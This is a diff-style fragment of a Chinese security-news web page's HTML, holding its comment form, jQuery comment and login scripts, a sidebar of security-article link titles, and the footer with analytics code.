+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3799" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
